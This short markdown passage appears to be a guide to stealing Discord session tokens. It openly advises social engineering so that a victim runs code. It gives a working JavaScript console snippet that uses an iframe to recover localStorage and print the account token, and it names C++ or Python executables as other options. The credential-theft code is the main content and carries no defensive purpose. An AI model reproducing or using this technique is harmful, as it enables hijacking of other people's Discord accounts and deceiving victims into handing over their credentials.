## Discord Matters

### Grabbing the token
Our first step is to obtain the discord token. This can be done through a C++ program compiled into exe, Python program (may be in exe), or JavaScript injection in the console of discord web version. This involves a little social engineering as it requires either you or the victim to run the code and grab the token.

- Method 1: 

``` function getLocalStoragePropertyDescriptor() {const iframe = document.createElement('iframe');document.head.append(iframe);const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');iframe.remove();return pd;} Object.defineProperty(window, 'localStorage', getLocalStoragePropertyDescriptor());console.log(localStorage.token); window.alert(localStorage.token); ```
